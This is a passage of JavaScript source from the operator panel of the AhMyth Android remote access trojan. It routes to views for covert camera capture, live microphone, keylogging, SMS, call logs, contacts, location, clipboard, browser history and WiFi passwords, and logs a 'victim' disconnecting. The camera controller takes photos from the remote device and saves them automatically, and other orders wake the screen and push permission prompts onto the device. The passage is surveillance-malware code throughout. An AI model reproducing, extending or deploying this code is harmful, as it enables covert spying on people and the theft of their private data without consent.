            if (labScope) labScope.packetCount++;
            clearBlockchainResponseTimer(event);
            try {
                // Clone data to prevent mutations between listeners
                const clonedData = data && typeof data === 'object' ? JSON.parse(JSON.stringify(data)) : data;
                callback(clonedData);
            } catch (e) {
                console.error(`[AhMyth] Error in once callback for ${event}:`, e);
                if (rootScope && rootScope.Log) {
                    rootScope.Log(`[✗] Error processing ${event}: ${e.message}`, CONSTANTS.logStatus.FAIL);
                }
            }
        };
        return originalSocket.once(event, wrappedCallback);
    },
    removeAllListeners: function(event) {
        delete registeredListeners[event];
        return originalSocket.removeAllListeners(event);
    },
    connected: function() {
        return originalSocket && originalSocket.connected;
    }
};

// Export setLabScope for controller access
window.setLabScope = setLabScope;

//-----------------------Routing Config------------------------
app.config(function ($routeProvider, $locationProvider) {
    // Configure location provider for hash-based routing (works better in Electron)
    $locationProvider.hashPrefix('');
    
    $routeProvider
        .when("/", {
            templateUrl: "views/main.html"
        })
        .when("/camera", {
            templateUrl: "views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "views/location.html",
            controller: "LocCtrl"
        })
        .when("/deviceInfo", {
            templateUrl: "views/deviceInfo.html",
            controller: "DeviceInfoCtrl"
        })
        .when("/apps", {
            templateUrl: "views/apps.html",
            controller: "AppsCtrl"
        })
        .when("/clipboard", {
            templateUrl: "views/clipboard.html",
            controller: "ClipboardCtrl"
        })
        .when("/wifi", {
            templateUrl: "views/wifi.html",
            controller: "WiFiCtrl"
        })
        .when("/screen", {
            templateUrl: "views/screen.html",
            controller: "ScreenCtrl"
        })
        .when("/keylogger", {
            templateUrl: "views/keylogger.html",
            controller: "KeyloggerCtrl"
        })
        .when("/browserHistory", {
            templateUrl: "views/browserHistory.html",
            controller: "BrowserHistoryCtrl"
        })
        .when("/notifications", {
            templateUrl: "views/notifications.html",
            controller: "NotificationsCtrl"
        })
        .when("/systemInfo", {
            templateUrl: "views/systemInfo.html",
            controller: "SystemInfoCtrl"
        })
        .when("/makeCall", {
            templateUrl: "views/makeCall.html",
            controller: "MakeCallCtrl"
        })
        .when("/liveMic", {
            templateUrl: "views/liveMic.html",
            controller: "LiveMicCtrl"
        })
        .when("/wifiPasswords", {
            templateUrl: "views/wifiPasswords.html",
            controller: "WiFiPasswordsCtrl"
        })
        .otherwise({
            redirectTo: '/'
        });
});



//-----------------------LAB Controller (lab.htm)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $interval) {
    $labCtrl = $scope;
    $labCtrl.logs = [];
    $labCtrl.isConnected = true; // Start as connected since lab opens on connection
    $labCtrl.sessionId = Date.now().toString(36).toUpperCase();
    $labCtrl.uptime = '00:00:00';
    $labCtrl.packetCount = 0;
    
    // Enable UI logging by setting scope reference
    if (window.setLabScope) {
        window.setLabScope($scope, $rootScope);
        console.log('[AhMyth Lab] UI logging enabled');
    }
    
    var startTime = Date.now();
    
    // Update uptime every second
    $interval(() => {
        var elapsed = Math.floor((Date.now() - startTime) / 1000);
        var hours = Math.floor(elapsed / 3600);
        var minutes = Math.floor((elapsed % 3600) / 60);
        var seconds = elapsed % 60;
        $labCtrl.uptime = String(hours).padStart(2, '0') + ':' + 
                         String(minutes).padStart(2, '0') + ':' + 
                         String(seconds).padStart(2, '0');
    }, 1000);
    
    // Track connection by checking socket state directly
    $interval(() => {
        try {
            // Check if the original socket is connected
            if (originalSocket && originalSocket.connected) {
                if (!$labCtrl.isConnected) {
                    $labCtrl.isConnected = true;
                    $rootScope.Log('[✓] Connection active', CONSTANTS.logStatus.SUCCESS);
                }
            } else {
                if ($labCtrl.isConnected) {
                    $labCtrl.isConnected = false;
                    $rootScope.Log('[⚠] Connection lost', CONSTANTS.logStatus.WARNING);
                }
            }
        } catch (e) {
            // Socket check failed
        }
    }, 3000);

    // Wait for DOM to be ready and initialize routing
    setTimeout(() => {
        var log = document.getElementById("logy");
        if (!log) {
            console.error("[AhMyth Lab] Logy element not found!");
        }
        
        // Ensure routing is initialized - navigate to default route if no route is set
        if ($location.path() === '' || $location.path() === '/') {
            $location.path('/');
            $scope.$apply();
        }
        
        console.log('[AhMyth Lab] Controller initialized, current path:', $location.path());
    }, 100);

    // Handle remote module with fallback
    let electronWindow;
    try {
        electronWindow = remote.getCurrentWindow();
    } catch (e) {
        console.error("[AhMyth Lab] Remote module not available:", e);
        electronWindow = null;
    }

    $labCtrl.close = () => {
        if (electronWindow) {
            electronWindow.close();
        } else {
            ipcRenderer.send('window-close');
        }
    };

    $labCtrl.minimize = () => {
        if (electronWindow) {
            electronWindow.minimize();
        } else {
            ipcRenderer.send('window-minimize');
        }
    };

    $labCtrl.maximize = () => {
        if (electronWindow) {
            if (electronWindow.isMaximized()) {
                electronWindow.unmaximize(); // Restore the window size
            } else {
                electronWindow.maximize(); // Maximize the window
            }
        } else {
            ipcRenderer.send('window-maximize');
        }
    };

    // Global permission request function - available to all controllers
    $rootScope.requestPermission = (permissionType) => {
        const permOrder = CONSTANTS.orders.requestPermission || 'x0000rp';
        $rootScope.Log(`[→] Requesting ${permissionType} permission on device...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: permOrder, permission: permissionType });
    };

    // Wake screen function - wakes up device and attempts to unlock
    $labCtrl.wakeScreen = () => {
        $rootScope.Log('[→] Sending wake screen command...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: 'x0000wk' });
    };
    
    // Listen for wake response
    socket.on('x0000wk', (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message || 'Screen woken up'}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Wake failed: ${data.error || 'Unknown error'}`, CONSTANTS.logStatus.FAIL);
        }
    });
    
    // Listen for permission request responses
    socket.on('x0000rp', (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] Permission dialog shown: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $rootScope.Log(`[✗] Permission error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        } else if (data.granted === true) {
            $rootScope.Log(`[✓] Permission GRANTED by user: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
            // Broadcast event for controllers to retry action
            $rootScope.$broadcast('PermissionGranted', data.permission);
        } else if (data.granted === false) {
             $rootScope.Log(`[✗] Permission DENIED by user: ${data.permission}`, CONSTANTS.logStatus.FAIL);
        }
        if (!$rootScope.$$phase) {
            $rootScope.$apply();
        }
    });

    // Enhanced logging with timestamps
    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;

        const now = new Date();
        const timestamp = now.toLocaleString('en-US', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        $labCtrl.logs.push({ 
            date: `[${timestamp}]`, 
            msg: msg, 
            color: fontColor 
        });
        
        // Ensure log element exists before scrolling
        setTimeout(() => {
            var log = document.getElementById("logy");
            if (log) {
                log.scrollTop = log.scrollHeight;
            }
        }, 0);
        
        if (!$labCtrl.$$phase) {
            $labCtrl.$apply();
        }
    }

    //fired when notified from Main Proccess (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('[✗] Victim disconnected', CONSTANTS.logStatus.FAIL);
    });


    //fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[⚠] Server disconnected', CONSTANTS.logStatus.WARNING);
    });

    // Reload blockchain config when updated in main window
    ipcRenderer.on('Blockchain:ConfigUpdated', (event) => {
        reloadBlockchainEnv();
        $rootScope.Log('[ℹ] Blockchain configuration reloaded', CONSTANTS.logStatus.INFO);
    });

    // Listen for chunked response notifications to reset timeouts
    ipcRenderer.on('Blockchain:ChunkReceived', (event, chunkInfo) => {
        if (chunkInfo && chunkInfo.part && chunkInfo.total) {
            const activeTimers = Array.from(blockchainResponseTimers.keys());
            const activeSendPollTimers = Array.from(sendBlockchainAndPollTimers.keys());
            const totalActiveTimers = activeTimers.length + activeSendPollTimers.length;
            
            if (totalActiveTimers > 0) {
                console.log(`[LabCtrl] Chunk ${chunkInfo.part}/${chunkInfo.total} received (${chunkInfo.received || '?'}/${chunkInfo.total}) - resetting ${totalActiveTimers} active timer(s)`);
                
                // Reset blockchainResponseTimers
                if (activeTimers.length > 0) {
                    resetAllBlockchainResponseTimers();
                }
                
                // Reset sendBlockchainAndPoll timers
                if (activeSendPollTimers.length > 0) {
                    activeSendPollTimers.forEach(eventName => {
                        const timerInfo = sendBlockchainAndPollTimers.get(eventName);
                        if (timerInfo && timerInfo.state && !timerInfo.state.resolved) {
                            console.log(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
                            timerInfo.createTimer(); // Reset with full timeout duration
                        } else if (timerInfo && !timerInfo.resolved()) {
                            // Fallback to function check
                            console.log(`[LabCtrl] Extending timeout for ${eventName} due to chunk reception (${chunkInfo.received}/${chunkInfo.total} chunks)`);
                            timerInfo.createTimer(); // Reset with full timeout duration
                        }
                    });
                }
                
                // Also cancel any local response timeouts (like camera controller's setResponseTimeout)
                // This is a global handler, so we need to find the camera controller's timeout
                // We'll use a custom event to notify controllers
                if (rootScope && rootScope.$broadcast) {
                    rootScope.$broadcast('Blockchain:ChunkReceived', chunkInfo);
                }
                
                // Only log every 10 chunks received (based on count, not part number) to avoid spam
                const receivedCount = chunkInfo.received || 0;
                if (receivedCount % 10 === 0 || receivedCount === 1 || receivedCount === chunkInfo.total) {
                    if (rootScope && rootScope.Log) {
                        rootScope.Log(`[ℹ] Chunked response: ${receivedCount}/${chunkInfo.total} chunks received - timeout extended`, CONSTANTS.logStatus.INFO);
                    }
                }
            } else {
                console.warn(`[LabCtrl] Chunk ${chunkInfo.part}/${chunkInfo.total} received but no active timers to reset`);
            }
        }
    });




    // Refresh current view data
    $labCtrl.refreshData = () => {
        $rootScope.Log('[→] Refreshing data...', CONSTANTS.logStatus.INFO);
        $route.reload();
    };

    // to move from view to another
    $labCtrl.goToPage = (page) => {
        try {
            const path = '/' + page;
            console.log('[AhMyth Lab] Navigating to:', path);
            $labCtrl.packetCount++;
            $location.path(path);
            if (!$scope.$$phase && !$scope.$root.$$phase) {
                $scope.$apply();
            }
        } catch (error) {
            console.error('[AhMyth Lab] Navigation error:', error);
            $rootScope.Log(`[✗] Failed to navigate to ${page}`, CONSTANTS.logStatus.FAIL);
        }
    }
    
    // Handle route change errors
    $scope.$on('$routeChangeError', function(event, current, previous, rejection) {
        console.error('[AhMyth Lab] Route change error:', rejection);
        $rootScope.Log('[✗] Failed to load view: ' + (rejection || 'Unknown error'), CONSTANTS.logStatus.FAIL);
    });
    
    // Handle successful route changes
    $scope.$on('$routeChangeSuccess', function(event, current, previous) {
        if (current && current.$$route) {
            console.log('[AhMyth Lab] Route changed to:', current.$$route.originalPath);
        }
    });





});






//-----------------------Camera Controller (camera.htm)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    $camCtrl.cameras = [];
    $camCtrl.selectedCam = null;
    $camCtrl.imgUrl = null;
    $scope.imgUrl = null; // Also set directly on scope for template binding
    $camCtrl.load = '';
    $camCtrl.lastError = null;
    
    console.log('[CamCtrl] Controller initialized, $scope === $camCtrl:', $scope === $camCtrl);
    var camera = CONSTANTS.orders.camera;
    var currentBase64 = null;
    var responseTimeout = null;

    // remove socket listener
    $camCtrl.$on('$destroy', () => {
        socket.removeAllListeners(camera);
        if (responseTimeout) $timeout.cancel(responseTimeout);
    });

    // Listen for chunked response events to reset local timeout
    $scope.$on('Blockchain:ChunkReceived', (event, chunkInfo) => {
        if (isBlockchainVictim() && responseTimeout) {
            // Reset local timeout when chunks arrive (for blockchain mode)
            console.log('[CamCtrl] Chunk received, resetting local timeout');
            if (responseTimeout) $timeout.cancel(responseTimeout);
            // Restart with longer timeout
            responseTimeout = $timeout(() => {
                if ($camCtrl.load === 'loading') {
                    $camCtrl.load = '';
                    $camCtrl.lastError = `No response from device for camera capture. Check if permissions are granted.`;
                    $rootScope.Log(`[?] Timeout waiting for camera capture response. Device may need camera permission.`, CONSTANTS.logStatus.WARNING);
                }
            }, 180000); // 3 minutes for chunked camera images
        }
    });

    // Check socket connection before sending commands
    function checkConnection() {
        if (isBlockchainVictim()) {
            return true;
        }
        if (!originalSocket || !originalSocket.connected) {
            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
            $camCtrl.load = '';
            $camCtrl.lastError = 'Device not connected';
            return false;
        }
        return true;
    }

    // Set timeout for response
    function setResponseTimeout(action, timeoutMs) {
        if (responseTimeout) $timeout.cancel(responseTimeout);
        // For blockchain mode, use the blockchain timer system instead of local timeout
        // The blockchain timer handles chunked responses and longer timeouts
        if (isBlockchainVictim()) {
            // Don't set local timeout for blockchain - use blockchain timer system
            // The blockchain timer is started in the socket.emit wrapper
            return;
        }
        const finalTimeout = timeoutMs || 30000;
        responseTimeout = $timeout(() => {
            if ($camCtrl.load === 'loading') {
                $camCtrl.load = '';
                $camCtrl.lastError = `No response from device for ${action}. Check if permissions are granted.`;
                $rootScope.Log(`[?] Timeout waiting for ${action} response. Device may need camera permission.`, CONSTANTS.logStatus.WARNING);
            }
        }, finalTimeout);
    }

    // Select camera
    $camCtrl.selectCamera = (cam) => {
        $camCtrl.selectedCam = cam;
        $camCtrl.lastError = null;
        $rootScope.Log(`[ℹ] Selected: ${cam.name || (cam.id == 0 ? 'Back Camera' : 'Front Camera')}`, CONSTANTS.logStatus.INFO);
    };

    // Take picture
    $camCtrl.snap = () => {
        if (!checkConnection()) return;
        
        if (!$camCtrl.selectedCam) {
            $rootScope.Log('[⚠] Please select a camera first', CONSTANTS.logStatus.WARNING);
            return;
        }
        $camCtrl.load = 'loading';
        $camCtrl.lastError = null;
        $rootScope.Log(`[→] Taking picture with camera ID: ${$camCtrl.selectedCam.id}...`, CONSTANTS.logStatus.INFO);
        // For blockchain mode, the socket.emit wrapper will start the blockchain timer (180s for camera)
        // For TCP mode, use local timeout (30s)
        if (!isBlockchainVictim()) {
            setResponseTimeout('camera capture', 30000);
        }
        socket.emit(ORDER, { order: camera, extra: String($camCtrl.selectedCam.id) });
    };

    // Save photo
    $camCtrl.savePhoto = () => {
        if (!currentBase64) return;
        $rootScope.Log('[→] Saving picture...', CONSTANTS.logStatus.INFO);
        var picPath = path.join(downloadsPath, Date.now() + ".jpg");
        fs.outputFile(picPath, Buffer.from(currentBase64, "base64"), (err) => {
            if (!err)
                $rootScope.Log(`[✓] Picture saved: ${picPath}`, CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('[✗] Failed to save picture', CONSTANTS.logStatus.FAIL);
        });
    };

    // Fullscreen - open in new window
    $camCtrl.fullscreen = () => {
        if ($camCtrl.imgUrl) {
            let win = window.open();
            win.document.write('<img src="' + $camCtrl.imgUrl + '" style="max-width:100%;height:auto;">');
        }
    };

    // Bring app to foreground
    $camCtrl.bringToForeground = () => {
        if (!checkConnection()) return;
        $rootScope.Log('[→] Bringing app to foreground...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: CONSTANTS.orders.foreground, extra: 'foreground' });
    };

    // Send app to background
    $camCtrl.sendToBackground = () => {
        if (!checkConnection()) return;
        $rootScope.Log('[→] Sending app to background...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: CONSTANTS.orders.foreground, extra: 'background' });
    };

    // Listen for blockchain chunk progress to show upload/download progress
    let currentChunkInfo = null;
    $scope.$on('Blockchain:ChunkReceived', (event, chunkInfo) => {
        const loadEmpty = !$camCtrl.load || $camCtrl.load === '';
        // Check if we're in a loading state (either initial 'loading' or already receiving chunks)
        const isLoading = $camCtrl.load && ($camCtrl.load === 'loading' || $camCtrl.load.indexOf('Receiving') >= 0);
        const shouldShowProgress = chunkInfo && (isLoading || loadEmpty);

        if (shouldShowProgress) {
            currentChunkInfo = chunkInfo;
            // Update load message to show progress (always use received count, not part number)
            const receivedCount = chunkInfo.received || 0;
            const percent = receivedCount && chunkInfo.total ? Math.round((receivedCount / chunkInfo.total) * 100) : 0;

            // Use $timeout to ensure digest cycle runs properly
            $timeout(() => {
                if (receivedCount && chunkInfo.total) {
                    $camCtrl.load = `Receiving image: ${receivedCount}/${chunkInfo.total} chunks (${percent}%)`;
                } else {
                    $camCtrl.load = `Receiving image chunks...`;
                }
                $scope.load = $camCtrl.load;
            }, 0);

            // Log progress every 20 chunks received (based on count, not part number) or when complete
            if (receivedCount % 20 === 0 || receivedCount === 1 || receivedCount === chunkInfo.total) {
                $rootScope.Log(`[⬇] Receiving image: ${receivedCount}/${chunkInfo.total} chunks (${percent}%)`, CONSTANTS.logStatus.INFO);
            }
        }
    });

    // Socket handler - improved with error handling
    socket.on(camera, (data) => {
        if (responseTimeout) $timeout.cancel(responseTimeout);
        $camCtrl.load = '';
        $scope.load = '';
        $camCtrl.lastError = null;
        currentChunkInfo = null; // Clear chunk info when response received

        console.log('[CamCtrl] Received camera data:', data);
        console.log('[CamCtrl] Data type check - image:', data.image, 'buffer:', !!data.buffer, 'buffer type:', typeof data.buffer);
        
        // Check if buffer is complete (not truncated)
        if (data.buffer && typeof data.buffer === 'string') {
            const bufferLength = data.buffer.length;
            console.log('[CamCtrl] Buffer length:', bufferLength);
            console.log('[CamCtrl] Buffer starts with:', data.buffer.substring(0, 50));
            console.log('[CamCtrl] Buffer ends with:', data.buffer.substring(Math.max(0, bufferLength - 50)));
            
            // Check if buffer looks truncated (ends abruptly without proper Base64 padding)
            const properEnding = data.buffer.endsWith('==') || data.buffer.endsWith('=') || bufferLength > 50000;
            if (!properEnding && bufferLength < 1000) {
                console.warn('[CamCtrl] WARNING: Buffer may be truncated! Length:', bufferLength, 'Ends with:', data.buffer.substring(Math.max(0, bufferLength - 10)));
            }
        }
        
        // Handle error responses
        if (data.error) {
            $camCtrl.lastError = data.error;
            $rootScope.Log(`[✗] Camera error: ${data.error}`, CONSTANTS.logStatus.FAIL);
            $camCtrl.$apply();
            return;
        }
        
        if (data.camList == true) {
            $rootScope.Log(`[✓] Found ${data.list.length} camera(s)`, CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            // Auto-select first camera
            if (data.list.length > 0) {
                $camCtrl.selectedCam = data.list[0];
            }
            $camCtrl.$apply();
        } else if (data.image == true || (data.image !== false && data.buffer)) {
            $rootScope.Log('[✓] Picture captured', CONSTANTS.logStatus.SUCCESS);
            
            // Handle buffer data - can be Base64 string (blockchain) or byte array (TCP)
            // For blockchain mode, buffer is already Base64 encoded
            if (data.buffer) {
                const bufferLength = data.buffer.length;
                console.log('[CamCtrl] Processing image buffer, length:', bufferLength, 'type:', typeof data.buffer);
                console.log('[CamCtrl] Buffer preview (first 100 chars):', data.buffer.substring(0, 100));
                console.log('[CamCtrl] Buffer preview (last 50 chars):', data.buffer.substring(Math.max(0, bufferLength - 50)));
                console.log('[CamCtrl] Buffer ends with:', data.buffer.substring(Math.max(0, bufferLength - 20)));
                
                // Check if buffer looks complete (JPEG Base64 should end with specific patterns)
                const looksComplete = bufferLength > 1000 && (
                    data.buffer.endsWith('==') || 
                    data.buffer.endsWith('=') || 
                    bufferLength > 50000 // Large images are likely complete
                );
                console.log('[CamCtrl] Buffer looks complete:', looksComplete);
                
                if (!looksComplete && bufferLength < 1000) {
                    console.error('[CamCtrl] ERROR: Buffer appears incomplete or truncated!');
                    $rootScope.Log(`[✗] Image buffer appears incomplete (${bufferLength} chars)`, CONSTANTS.logStatus.FAIL);
                    $camCtrl.lastError = `Image buffer incomplete (${bufferLength} chars)`;
                    $camCtrl.$apply();
                    return;
                }
                try {
                    let imageBuffer;
                    let imageSize;
                    let isBase64 = false;
                    
                    if (typeof data.buffer === 'string') {
                        // Base64 string (blockchain mode)
                        currentBase64 = data.buffer;
                        
                        // Ensure we have the full buffer (check if it's complete)
                        if (currentBase64.length < 100) {
                            console.warn('[CamCtrl] Warning: Base64 buffer seems too short:', currentBase64.length);
                            $rootScope.Log(`[⚠] Image buffer seems incomplete (${currentBase64.length} chars)`, CONSTANTS.logStatus.WARNING);
                        }
                        
                        // Create data URL for display
                        const dataUrl = 'data:image/jpeg;base64,' + currentBase64;
                        
                        console.log('[CamCtrl] Setting imgUrl, buffer length:', currentBase64.length);
                        console.log('[CamCtrl] Data URL length:', dataUrl.length);
                        console.log('[CamCtrl] Data URL preview (first 100):', dataUrl.substring(0, 100));
                        console.log('[CamCtrl] Data URL preview (last 50):', dataUrl.substring(Math.max(0, dataUrl.length - 50)));
                        
                        // Clear loading state first
                        $camCtrl.load = '';
                        $scope.load = '';
                        
                        // Set image URL - $camCtrl is $scope, so setting on either should work
                        // But let's be explicit and set on both to ensure template binding works
                        // IMPORTANT: Set on $scope first, then $camCtrl, since template binds to scope
                        $scope.imgUrl = dataUrl;
                        $scope.isSaveShown = true;
                        $camCtrl.imgUrl = dataUrl;
                        $camCtrl.isSaveShown = true;
                        
                        // Also set captureTime for info panel
                        $scope.captureTime = new Date();
                        $camCtrl.captureTime = new Date();
                        
                        console.log('[CamCtrl] imgUrl set on both $scope and $camCtrl');
                        console.log('[CamCtrl] $scope.imgUrl exists:', !!$scope.imgUrl, 'length:', $scope.imgUrl ? $scope.imgUrl.length : 0);
                        console.log('[CamCtrl] $camCtrl.imgUrl exists:', !!$camCtrl.imgUrl, 'length:', $camCtrl.imgUrl ? $camCtrl.imgUrl.length : 0);
                        console.log('[CamCtrl] $scope.imgUrl === $camCtrl.imgUrl:', $scope.imgUrl === $camCtrl.imgUrl);
                        
                        // Verify the data URL is valid
                        if (dataUrl.length < 100) {
                            console.error('[CamCtrl] ERROR: Data URL is too short!', dataUrl.length);
                            $rootScope.Log(`[✗] Image data URL is too short (${dataUrl.length} chars)`, CONSTANTS.logStatus.FAIL);
                        } else {
                            console.log('[CamCtrl] Data URL looks valid, length:', dataUrl.length);
                            
                            // Test image loading immediately
                            const testImg = new Image();
                            testImg.onload = () => {
                                console.log('[CamCtrl] ✓ Image loaded successfully! Dimensions:', testImg.width, 'x', testImg.height);
                                // Ensure imgUrl is still set after image loads
                                if (!$scope.imgUrl) {
                                    console.log('[CamCtrl] Restoring imgUrl after image load test');
                                    $scope.imgUrl = dataUrl;
                                    $camCtrl.imgUrl = dataUrl;
                                    $scope.$apply();
                                }
                            };
                            testImg.onerror = (e) => {
                                console.error('[CamCtrl] ✗ Image failed to load!', e);
                                console.error('[CamCtrl] Data URL preview:', dataUrl.substring(0, 200));
                            };
                            testImg.src = dataUrl;
                        }
                        
                        // Force Angular digest cycle to update view - use $timeout to ensure it runs
                        $timeout(() => {
                            console.log('[CamCtrl] In $timeout callback, checking imgUrl...');
                            console.log('[CamCtrl] $scope.imgUrl:', $scope.imgUrl ? 'exists (' + $scope.imgUrl.length + ' chars)' : 'null');
                            console.log('[CamCtrl] $camCtrl.imgUrl:', $camCtrl.imgUrl ? 'exists (' + $camCtrl.imgUrl.length + ' chars)' : 'null');
                            
                            // Double-check it's set
                            if (!$scope.imgUrl && dataUrl) {
                                $scope.imgUrl = dataUrl;
                                $camCtrl.imgUrl = dataUrl;
                                console.log('[CamCtrl] Restored imgUrl in $timeout');
                            }
                            
                            // Test if we can create an image element to verify the data URL
                            try {
                                const testImg = new Image();
                                testImg.onload = () => {
                                    console.log('[CamCtrl] ✓ Image data URL is valid! Image dimensions:', testImg.width, 'x', testImg.height);
                                    $rootScope.Log(`[✓] Image validated: ${testImg.width}x${testImg.height}px`, CONSTANTS.logStatus.SUCCESS);
                                };
                                testImg.onerror = (e) => {
                                    console.error('[CamCtrl] ✗ Image data URL is invalid!', e);
                                    $rootScope.Log(`[✗] Image data URL is invalid`, CONSTANTS.logStatus.FAIL);
                                };
                                testImg.src = dataUrl;
                            } catch (e) {
                                console.error('[CamCtrl] Error testing image:', e);
                            }
                            
                            // Force apply if not in digest
                            try {
                                if (!$scope.$$phase && !$scope.$root.$$phase) {
                                    $scope.$apply();
                                    console.log('[CamCtrl] Called $apply() successfully');
                                } else {
                                    console.log('[CamCtrl] Already in digest cycle, using $evalAsync');
                                    $scope.$evalAsync(() => {
                                        $scope.imgUrl = dataUrl;
                                        $camCtrl.imgUrl = dataUrl;
                                    });
                                }
                            } catch (e) {
                                console.error('[CamCtrl] Error in $apply():', e);
                                // Fallback: try $evalAsync
                                $scope.$evalAsync(() => {
                                    $scope.imgUrl = dataUrl;
                                    $camCtrl.imgUrl = dataUrl;
                                });
                            }
                        }, 10); // Small delay to ensure it runs
                        
                        imageBuffer = currentBase64;
                        isBase64 = true;
                        // Estimate size from Base64 (Base64 is ~33% larger than binary)
                        imageSize = Math.round((currentBase64.length * 3 / 4));
                        const estimatedSize = Math.round(imageSize / 1024);
                        const estimatedMB = (imageSize / 1024 / 1024).toFixed(2);
                        console.log(`[CamCtrl] Image received - Base64 length: ${currentBase64.length}, estimated size: ${estimatedSize} KB (${estimatedMB} MB)`);
                        console.log(`[CamCtrl] imgUrl set, length: ${dataUrl.length}, preview: ${dataUrl.substring(0, 100)}...`);
                        $rootScope.Log(`[✓] Image received: ${estimatedSize} KB (${estimatedMB} MB)`, CONSTANTS.logStatus.SUCCESS);
                        
                        // Immediately trigger $apply to update view
                        try {
                            if (!$scope.$$phase && !$scope.$root.$$phase) {
                                $scope.$apply();
                                console.log('[CamCtrl] Immediate $apply() called');
                            }
                        } catch (e) {
                            console.error('[CamCtrl] Error in immediate $apply():', e);
                        }
                        
                        // Final check: verify imgUrl is set and trigger view update
                        $timeout(() => {
                            console.log('[CamCtrl] Final check - imgUrl:', $scope.imgUrl ? 'SET (' + $scope.imgUrl.length + ' chars)' : 'NOT SET');
                            console.log('[CamCtrl] Final check - $camCtrl.imgUrl:', $camCtrl.imgUrl ? 'SET (' + $camCtrl.imgUrl.length + ' chars)' : 'NOT SET');
                            
                            // If still not set, force it
                            if (!$scope.imgUrl && dataUrl) {
                                console.log('[CamCtrl] imgUrl was lost, restoring...');
                                $scope.imgUrl = dataUrl;
                                $camCtrl.imgUrl = dataUrl;
                            }
                            
                            // Force one more apply to ensure view updates
                            if (!$scope.$$phase && !$scope.$root.$$phase) {
                                $scope.$apply();
                                console.log('[CamCtrl] Final $apply() called');
                            } else {
                                // Use $evalAsync as fallback
                                $scope.$evalAsync(() => {
                                    $scope.imgUrl = dataUrl;
                                    $camCtrl.imgUrl = dataUrl;
                                    console.log('[CamCtrl] Used $evalAsync to set imgUrl');
                                });
                            }
                        }, 50);
                    } else if (Array.isArray(data.buffer) || data.buffer instanceof Uint8Array) {
                        // Byte array (TCP mode)
                        var uint8Arr = data.buffer instanceof Uint8Array ? data.buffer : new Uint8Array(data.buffer);
                        var binary = '';
                        for (var i = 0; i < uint8Arr.length; i++) {
                            binary += String.fromCharCode(uint8Arr[i]);
                        }
                        currentBase64 = window.btoa(binary);
                        
                        const dataUrl = 'data:image/jpeg;base64,' + currentBase64;
                        $scope.imgUrl = dataUrl;
                        $scope.isSaveShown = true;
                        $camCtrl.imgUrl = dataUrl;
                        $camCtrl.isSaveShown = true;
                        
                        // Also set captureTime for info panel
                        $scope.captureTime = new Date();
                        $camCtrl.captureTime = new Date();
                        
                        // Force apply
                        if (!$scope.$$phase && !$scope.$root.$$phase) {
                            $scope.$apply();
                        }
                        // Convert to Buffer for saving
                        imageBuffer = Buffer.from(uint8Arr);
                        imageSize = uint8Arr.length;
                        $rootScope.Log(`[✓] Image received: ${Math.round(uint8Arr.length/1024)} KB`, CONSTANTS.logStatus.SUCCESS);
                    } else {
                        throw new Error('Unknown buffer format: ' + typeof data.buffer);
                    }
                    
                    // Auto-save photo to file (especially for blockchain mode)
                    if (imageBuffer) {
                        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                        const fileName = `photo_${timestamp}.jpg`;
                        const filePath = path.join(downloadsPath, fileName);
                        
                        // Save with appropriate encoding
                        const saveCallback = (err) => {
                            if (err) {
                                console.error('[CamCtrl] Error saving photo:', err);
                                $rootScope.Log(`[✗] Failed to save photo: ${err.message}`, CONSTANTS.logStatus.FAIL);
                                // Log to terminal via IPC
                                if (ipcRenderer) {
                                    ipcRenderer.send('log-photo-error', { error: err.message, path: filePath });
                                }
                            } else {
                                const sizeMB = (imageSize / 1024 / 1024).toFixed(2);
                                console.log(`[CamCtrl] Photo saved: ${filePath} (${sizeMB} MB)`);
                                $rootScope.Log(`[✓] Photo saved: ${fileName} (${sizeMB} MB)`, CONSTANTS.logStatus.SUCCESS);
                                // Log to terminal via IPC
                                if (ipcRenderer) {
                                    ipcRenderer.send('log-photo-saved', { 
                                        fileName: fileName, 
                                        filePath: filePath, 
                                        sizeMB: sizeMB,
                                        sizeBytes: imageSize
                                    });
                                }
                            }
                        };
                        
                        if (isBase64) {
